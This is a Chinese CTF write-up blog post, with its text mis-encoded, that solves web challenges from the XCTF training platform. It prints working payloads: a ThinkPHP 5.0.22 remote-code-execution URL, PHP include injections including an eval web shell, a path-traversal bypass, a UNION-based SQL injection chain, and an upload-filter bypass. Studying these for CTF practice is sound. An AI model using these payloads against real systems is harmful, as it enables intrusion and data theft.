<!DOCTYPE html>


<html lang="en">


<head>
  <meta name="baidu-site-verification" content="code-3rVA1ADdSj" />
  <meta name="google-site-verification" content="Q0OkO0z4Tyc3lTN8vDrqENch_A9Fw2-fhFkeFiffDMw" />
  <meta charset="utf-8" />
   
  <meta name="keywords" content="Hexo,ayer,ä»£ç ,åšå®¢" />
   
  <meta name="description" content="welcome to Sung&#39;s Blog" />
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <title>
    æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒº |  Sung&#39;s Blog
  </title>
  <meta name="generator" content="hexo-theme-ayer">
  
  <link rel="shortcut icon" href="/favicon.ico" />
  
  
<link rel="stylesheet" href="/dist/main.css">

  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
  
<link rel="stylesheet" href="/css/custom.css">

  
  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
  
  

  
<script>
var _hmt = _hmt || [];
(function() {
	var hm = document.createElement("script");
	hm.src = "https://hm.baidu.com/hm.js?80b2f48cd548787f831c320e7eb27d4c";
	var s = document.getElementsByTagName("script")[0]; 
	s.parentNode.insertBefore(hm, s);
})();
</script>


<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><link rel="alternate" href="/atom.xml" title="Sung's Blog" type="application/atom+xml">
</head>
</html>
</html>

<body>
  <div id="app">
    
      <canvas class="fireworks"></canvas>
      <style>
        .fireworks {
          position: fixed;
          left: 0;
          top: 0;
          z-index: 99999;
          pointer-events: none;
        }
      </style>
      
      
    <main class="content on">
      <section class="outer">
  <article
  id="post-æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒº"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
  æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒº
</h1>
 

    </header>
     
    <div class="article-meta">
      <a href="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/" class="article-date">
  <time datetime="2021-08-09T16:00:00.000Z" itemprop="datePublished">2021-08-10</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>
  
<div class="word_count">
    <span class="post-time">
        <span class="post-meta-item-icon">
            <i class="ri-quill-pen-line"></i>
            <span class="post-meta-item-text"> Word count:</span>
            <span class="post-count">6.1k</span>
        </span>
    </span>

    <span class="post-time">
        &nbsp; | &nbsp;
        <span class="post-meta-item-icon">
            <i class="ri-book-open-line"></i>
            <span class="post-meta-item-text"> Reading timeâ‰ˆ</span>
            <span class="post-count">29 min</span>
        </span>
    </span>
</div>
 
    </div>
      
    <div class="tocbot"></div>




  
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒº"><a href="#æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒº" class="headerlink" title="æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒº"></a>æ”»é˜²ä¸–ç•Œwebè¿›é˜¶åŒº</h1><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>æ”»é˜²ä¸–ç•Œè¿›é˜¶åŒºï¼Œé¢˜é‡å¤šï¼Œæ…¢æ…¢è€ã€‚</p>
<h2 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h2><h3 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h3><p>ç¬¬ä¸€ä¸ªé¡µé¢æ˜¯index.phpï¼Œæ¯ä¸ªç½‘ç«™éƒ½æœ‰ï¼Œæœ¬é¢˜ä¼šè·³è½¬åˆ°1.phpï¼Œæ‰€ä»¥æŠ“åŒ…å³å¯å¾—åˆ°</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210809233134941.png" alt="image-20210809233134941"></p>
<h3 id="Training-www-Robots"><a href="#Training-www-Robots" class="headerlink" title="Training-www-Robots"></a>Training-www-Robots</h3><p>æ ¹æ®æç¤ºè®¿é—®robots.txtï¼Œçœ‹åˆ°å¦‚ä¸‹é¡µé¢ï¼Œè®¿é—®/f10g.phpå³å¯å¾—åˆ°flagã€‚</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210812141706915.png" alt="image-20210812141706915"></p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210812141749360.png" alt="image-20210812141749360"></p>
<h3 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h3><p>æ ¹æ®æç¤ºè¿™é“é¢˜æ˜¯php rceæ¼æ´ï¼Œthinkphp5.0.22ç‰ˆæœ¬ï¼Œè¿™ä¸ªæ˜¯å·²ç»æŠ«éœ²çš„æ¼æ´ï¼Œæ‰¾åˆ°å®ƒçš„åˆ©ç”¨æ–¹å¼ã€‚</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210812160017327.png" alt="image-20210812160017327"></p>
<p><code>payload:/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag</code></p>
<p><code>vars[1][]</code>åé¢è·Ÿçš„æ˜¯ä»»æ„æ‰§è¡Œçš„å‘½ä»¤è¡Œ<code>cat /flag</code>ï¼Œå¯ä»¥å…ˆ<code>find / -name flag</code>æ‰¾åˆ°flagæ–‡ä»¶<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210812182303546.png" alt="image-20210812182303546"></p>
<h3 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h3><p>ä»£ç è¿‡æ»¤äº†<code>php://</code>åè®®ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨å¤§å†™çš„<code>PHP://</code>æ¥ç»•è¿‡ï¼Œåˆ©ç”¨pageå‚æ•°çš„payload:</p>
<ol>
<li>PHP://inputï¼Œç„¶åPOST <code>&lt;?php phpinfo();?&gt;</code></li>
<li><code>?page=data://text/plain,&lt;?php%20system(&#39;ls&#39;)?&gt;</code></li>
<li><code>?page=data://text/plain,&lt;?php%20@eval $_POST[&#39;sung&#39;];?&gt;</code>ï¼Œantswordè¿æ¥</li>
</ol>
<p>å¯¹äºhelloå‚æ•°çš„ç”¨æ³•æ›´ç®€å•ï¼Œç›´æ¥<code>?hello=&lt;?php system(&#39;ls&#39;);?&gt;</code></p>
<p>çœ‹wpè¿˜æœ‰ä¸€ç§ç›´æ¥ç™»å½•phpadminç„¶ååœ¨æ•°æ®åº“å†™é©¬ï¼Œantswordè¿æ¥ã€‚</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210812194901568.png" alt="image-20210812194901568"></p>
<h3 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h3><p>æš´åŠ›ç ´è§£ï¼ŒburpæŠ“åŒ…å‘åˆ°intuderæ¨¡å—ï¼Œå¯¹idå‚æ•°æ•´æ•°çˆ†ç ´ï¼Œid=2333å¾—åˆ°çš„å“åº”é•¿åº¦ä¸åŒï¼ŒæŸ¥çœ‹flagã€‚</p>
<h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><p>è¿›å»åªæœ‰ä¸€å¼ è¡¨æƒ…åŒ…ï¼ŒæŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œæ³¨é‡Šé‡Œå†™ç€<code>source.php</code>ï¼Œç”¨burpæ‰«æç›®å½•ã€‚</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816084257141.png" alt="image-20210816084257141"></p>
<p>æˆ‘ä»¬å¾—åˆ°äº†æºç ï¼Œä»£ç å®¡è®¡ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>]; <span class="comment">//æ•°ç»„ï¼šç´¢å¼•=&gt;å­—ç¬¦ä¸²</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(                       <span class="comment">//æˆªå–ä¸€æ®µå­—ç¬¦ä¸²</span></span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)           <span class="comment">//è¿”å›?çš„ä½ç½®</span></span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);                <span class="comment">//urlè§£ç </span></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;       <span class="comment">//æˆªåˆ°source.phpæˆ–è€…hint.php</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>]) )</span><br><span class="line">    &#123;                                               <span class="comment">//fileå­—ç¬¦ä¸²è¦é€šè¿‡checkfileéªŒè¯</span></span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥æˆ‘ä»¬çš„ç›®çš„å°±æ˜¯è®©<code>file</code>å‚æ•°ä¼ å…¥ä¸€ä¸ªæ–‡ä»¶ç»•è¿‡checkFileå‡½æ•°éªŒè¯ï¼Œæ„é€ <code>payload:?file=hint.php?</code>ï¼Œé€šè¿‡ç¬¬ä¸€ä¸ªifåˆ¤æ–­return trueã€‚ä¸€äº›wpå¯¹<code>?</code>è¿›è¡Œä¸¤æ¬¡urlç¼–ç æ˜¯ä¸ºäº†é€šè¿‡ç¬¬äºŒä¸ªifã€‚</p>
<p>å¦‚ä½•è¿ç”¨includeå»å¾—åˆ°æˆ‘ä»¬çš„flagï¼Ÿ</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816112901649.png" alt="image-20210816112901649"></p>
<p>includeçš„å¯»æ‰¾é¡ºåºï¼š</p>
<ol>
<li>å…ˆæŒ‰å‚æ•°ç»™å‡ºçš„è·¯å¾„å¯»æ‰¾ï¼Œç»™å‡ºç»å¯¹è·¯å¾„ï¼ˆ<code>/</code>å¼€å¤´ï¼‰æˆ–è€…ç›¸å¯¹è·¯å¾„ï¼ˆ<code>./</code>æˆ–è€…<code>../</code>ï¼‰</li>
<li>æ²¡æœ‰ç»™å‡ºè·¯å¾„åˆ™æŒ‰ç…§<code>include_path</code>è§„å®šçš„ç›®å½•å¯»æ‰¾</li>
<li>å†æ‰¾ä¸åˆ°å°±åœ¨æ–‡ä»¶æ‰€åœ¨ç›®å½•æˆ–è€…å½“å‰ç›®å½•ä¸‹å¯»æ‰¾ã€‚</li>
</ol>
<p>æ‰€ä»¥payload:<code>?file=hint.php?/../../../../ffffllllaaaagggg</code></p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816142146352.png" alt="image-20210816142146352"></p>
<h3 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h3><p>æ²¡æœ‰ä»»ä½•è¿‡æ»¤çš„sqlæ³¨å…¥ã€‚</p>
<p>åˆ¤æ–­å…¶å­—æ®µæ•°ï¼š<code>&#39; and 1=0 union select 1,2,3#</code>ã€‚æˆåŠŸå›æ˜¾</p>
<p>åˆ¤æ–­å½“å‰æ•°æ®åº“åä»¥åŠç‰ˆæœ¬ï¼š<code>&#39; and 1=0 union select 1,database(),version()#</code>ã€‚</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816080824462.png" alt="image-20210816080824462"></p>
<p>è·å¾—æ‰€æœ‰çš„æ•°æ®åº“åï¼š<code>111&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata#</code></p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816081723926.png" alt="image-20210816081723926"></p>
<p>æŸ¥è¯¢<code>news</code>æ•°æ®åº“ä¸­çš„è¡¨ä¿¡æ¯ï¼š<code>111&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</code></p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816082336320.png" alt="image-20210816082336320"></p>
<p>æŸ¥çœ‹<code>secret_table</code>è¡¨ä¸­çš„åˆ—ä¿¡æ¯ï¼š<code>111&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;secret_table&quot;#</code></p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816082311624.png" alt="image-20210816082311624"></p>
<p>æŸ¥çœ‹<code>fl4g</code>ä¸­çš„ä¿¡æ¯ï¼š<code>111&#39; union select 1,2,group_concat(fl4g) from news.secret_table#</code></p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816082430767.png" alt="image-20210816082430767"></p>
<p><code>flag: QCTF&#123;sq1_inJec7ion_ezzz&#125;</code></p>
<h3 id="NaNa"><a href="#NaNa" class="headerlink" title="NaNa"></a>NaNa</h3><p>é™„ä»¶ä¸‹è½½åçš„å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	_=<span class="string">&#x27;function$()&#123;e=getEleById(&quot;c&quot;).value;length==16^be0f23233ace98aa$c7be9)&#123;tfls_aie&#125;na_h0lnrg&#123;e_0iit\&#x27;_ns=[t,n,r,i];for(o=0;o&lt;13;++o)&#123;	[0]);.splice(0,1)&#125;&#125;&#125;	\&#x27;&lt;input id=&quot;c&quot;&gt;&lt; onclick=$()&gt;Ok&lt;/&gt;\&#x27;);delete _var &quot;,&quot;docu.)match(/&quot;];/)!=null=[&quot;	write(s[o%4]buttonif(e.ment&#x27;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(Y <span class="keyword">in</span> $=<span class="string">&#x27;	&#x27;</span>)</span><br><span class="line">		<span class="keyword">with</span>(_.split($[Y]))  _=join(pop());</span><br><span class="line">	<span class="built_in">eval</span>(_)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢æœ‰å¾ˆå¤šçº¢ç‚¹æ²¡æ³•æ˜¾ç¤ºï¼Œæ˜¯å› ä¸ºç¼–ç çš„é—®é¢˜ï¼Œä¸è¿‡æ¯ä¸ªå­—ç¬¦éƒ½æ˜¯ä¸ä¸€æ ·çš„ã€‚</p>
<p>ä»£ç æ‰§è¡Œè¿‡ç¨‹ï¼š</p>
<ol>
<li><p><code>_</code>å˜é‡èµ‹å€¼ä¸€ä¸ªå­—ç¬¦ä¸²</p>
</li>
<li><p><code>for</code>å¾ªç¯ï¼Œ<code>Y</code>å˜é‡å–ä¸€ä¸ªå¥‡æ€ªçš„å­—ç¬¦</p>
</li>
<li><p>å¾ªç¯å†…éƒ¨ï¼Œ<code>with</code>è¯­å¥ç›¸å½“äº<code>_=_.split($[Y]).join(_.split($[Y]).pop())</code></p>
</li>
<li><p>æœ€å<code>eval</code>å‡½æ•°æ‰§è¡Œå¤„ç†ä¹‹åçš„å­—ç¬¦ä¸²ã€‚</p>
</li>
</ol>
<p>å› ä¸ºjavascriptæ²¡æœ‰è¾“å‡ºè¯­å¥ï¼Œæˆ‘ä»¬å°†evalç›´æ¥æ”¹æˆ<code>alert(_)</code>æˆ–è€…<code>document.write(_)</code>ç­‰</p>
<p>å¾—åˆ°ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">$</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> e=<span class="built_in">document</span>.getElementById(<span class="string">&quot;c&quot;</span>).value;</span><br><span class="line">    <span class="keyword">if</span>(e.length==<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span>(e.match(<span class="regexp">/^be0f23/</span>)!=<span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">if</span>(e.match(<span class="regexp">/233ac/</span>)!=<span class="literal">null</span>)</span><br><span class="line">                <span class="keyword">if</span>(e.match(<span class="regexp">/e98aa$/</span>)!=<span class="literal">null</span>)</span><br><span class="line">                    <span class="keyword">if</span>(e.match(<span class="regexp">/c7be9/</span>)!=<span class="literal">null</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">var</span> t=[<span class="string">&quot;fl&quot;</span>,<span class="string">&quot;s_a&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;e&#125;&quot;</span>];</span><br><span class="line">                        <span class="keyword">var</span> n=[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;_h0l&quot;</span>,<span class="string">&quot;n&quot;</span>];</span><br><span class="line">                        <span class="keyword">var</span> r=[<span class="string">&quot;g&#123;&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;_0&quot;</span>];</span><br><span class="line">                        <span class="keyword">var</span> i=[<span class="string">&quot;it&#x27;&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;n&quot;</span>];</span><br><span class="line">                        <span class="keyword">var</span> s=[t,n,r,i];</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">var</span> o=<span class="number">0</span>;o&lt;<span class="number">13</span>;++o)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="built_in">document</span>.write(s[o%<span class="number">4</span>][<span class="number">0</span>]);</span><br><span class="line">                            s[o%<span class="number">4</span>].splice(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&#x27;&lt;input id=&quot;c&quot;&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">delete</span> _</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ»¡è¶³<code>if</code>è¿™äº›æ¡ä»¶ï¼Œé‚£å°±è®¡ç®—å¾—åˆ°<code>flag</code>ï¼Œç›´æ¥å°†<code>if</code>è¯­å¥çš„è®¡ç®—å¼ç²˜è´´åˆ°æ§åˆ¶å°ï¼Œç»“æœå¦‚ä¸‹ï¼š<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210901225754630.png" alt="image-20210901225754630"></p>
<h3 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h3><p>è¿›å»ä¹‹åå•¥ä¹Ÿæ²¡çœ‹åˆ°ï¼Œhint: Can you anthenticate to this website?ï¼ŒéªŒè¯èº«ä»½ï¼Œç”¨burpæ·»åŠ ç›®å½•å­—å…¸æ‰«æï¼Œå‘ç°äº†<code>index.phps</code>éå¸¸å¥‡æ€ªçš„ä¸€ä¸ªæ–‡ä»¶ï¼Œæˆ‘ä»¬è®¿é—®å¾—åˆ°äº†æºä»£ç ã€‚</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210815182807625.png" alt="image-20210815182807625"></p>
<p>æºç å¦‚ä¸‹</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210815183226544.png" alt="image-20210815183226544"></p>
<p>æ‰€ä»¥å°±æ˜¯idå‚æ•°è¦ç­‰äºurlç¼–ç çš„adminï¼Œæ‰€ä»¥payloadç­‰äº<code>index.php?id=%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65</code>ã€‚æ³¨æ„æµè§ˆå™¨æœ¬èº«ä¼šå¯¹urlè¿›è¡Œè§£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è¿›è¡Œä¸¤æ¬¡ç¼–ç ã€‚</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210815183551331.png" alt="image-20210815183551331"></p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210815183847894.png" alt="image-20210815183847894"></p>
<h3 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h3><p>ä¹‹å‰å·²ç»äº†è§£è¿‡ååºåˆ—åŒ–çš„ç›¸å…³çŸ¥è¯†äº†ï¼Œç›¸æ¯”è¾ƒHNUçš„ååºåˆ—åŒ–ï¼Œè¿™é“å¾ˆç®€å•äº†ã€‚</p>
<p>æˆ‘ä»¬éœ€è¦ç»•è¿‡çš„æ˜¯<code>_wakeup()</code>å‡½æ•°ï¼Œåªéœ€è¦å°†æˆå‘˜æ•°ä»1æ”¹æˆ2å°±è¡Œäº†</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816150334273.png" alt="image-20210816150334273"></p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816150727147.png" alt="image-20210816150727147"></p>
<h3 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h3><p>ä¸Šä¼ æ–‡ä»¶æ¼æ´ï¼Œé€‰æ‹©ä¸€ä¸ªphpæ–‡ä»¶å‘ç°è¿ä¸Šä¼ éƒ½ä¸Šä¼ ä¸äº†ï¼Œå‰ç«¯é™åˆ¶äº†ä¸Šä¼ æ–¹å¼ï¼Œå…¶å®å¯ä»¥ç›´æ¥åˆ é™¤disabledå±æ€§æäº¤ã€‚</p>
<p>ä½†æ˜¯ä¸ºäº†å­¦ä¹ ï¼Œæˆ‘ä»¬æŸ¥çœ‹æºã€‚</p>
<p><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816162642338.png" alt="image-20210816162642338"></p>
<p>å°±æ˜¯ä½¿ç”¨check()å‡½æ•°å»æ£€æŸ¥æ˜¯å¦å¯ä»¥ä¸Šä¼ ï¼Œ<code>name.replace(/^.+\./, &#39;&#39;)</code>è¡¨ç¤ºå°†<code>.</code>ä¹‹å‰çš„æ–‡ä»¶åæ›¿æ¢ä¸ºç©º</p>
<p><code>arr[].contaings(ext)</code>å¦‚æœæ£€æŸ¥åˆ°æ•°ç»„åŒ…å«extå…ƒç´ ï¼Œåˆ™è¿”å›trueã€‚</p>
<p>æ‰€ä»¥æ–¹æ³•æœ‰ï¼š</p>
<ol>
<li>F12åˆ é™¤disabledï¼Œå³å¯ç›´æ¥ä¸Šä¼ phpæ–‡ä»¶<br><img src="/2021/08/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/image-20210816190351845.png" alt="image-20210816190351845"></li>
<li>å…ˆä¸Šä¼ jpgæ–‡ä»¶ï¼ŒburpæŠ“åŒ…ç„¶åä¿®æ”¹æ–‡ä»¶åç¼€åã€‚</li>
</ol>
